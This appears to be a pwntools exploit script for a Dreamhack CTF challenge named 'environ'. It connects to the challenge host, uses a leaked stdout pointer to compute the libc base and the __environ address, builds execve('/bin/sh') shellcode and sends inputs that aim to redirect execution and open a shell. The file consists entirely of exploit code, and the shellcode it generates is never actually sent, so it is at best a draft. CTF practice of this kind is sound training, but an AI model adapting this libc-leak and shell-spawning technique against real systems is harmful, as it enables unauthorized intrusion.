from pwn import *

port = 21384
rem = remote("host3.dreamhack.games", port)
# rem = process("./Pwnable/environ/problem/environ")
# gdb.attach(rem)

lib = ELF("./Pwnable/environ/problem/libc.so.6")

rem.recvuntil(b'stdout: 0x')
stdout_addr = int(rem.recvn(12).decode(), 16)
print(hex(stdout_addr - lib.symbols['_IO_2_1_stdout_']))
lib_base = stdout_addr - lib.symbols['_IO_2_1_stdout_']
environ_addr = lib_base + lib.symbols['__environ']

shellcode = shellcraft.execve("/bin/sh", 0, 0)
print(len(asm(shellcode)))

rem.sendlineafter(b'Size: ', b'100')

rem.sendlineafter(b'Data: ', b'\x00' * 0x18)

rem.sendlineafter(b'jmp=', str(environ_addr).encode())

rem.interactive()